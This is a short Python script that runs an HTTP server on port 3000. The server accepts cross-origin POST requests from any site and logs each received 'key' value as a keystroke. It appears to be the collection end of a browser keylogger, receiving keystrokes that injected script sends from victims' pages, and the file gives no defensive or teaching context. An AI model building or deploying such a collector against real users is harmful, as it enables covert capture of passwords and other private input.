from http.server import BaseHTTPRequestHandler, HTTPServer
import json

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        body = self.rfile.read(length)
        
        try:
            data = json.loads(body.decode('utf-8'))
            print(f"KEYSTROKE: {data.get('key')}", flush=True)
        except:
            print("Error parsing data", flush=True)
            
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()

print("Listening on port 3000...", flush=True)
HTTPServer(('0.0.0.0', 3000), Handler).serve_forever()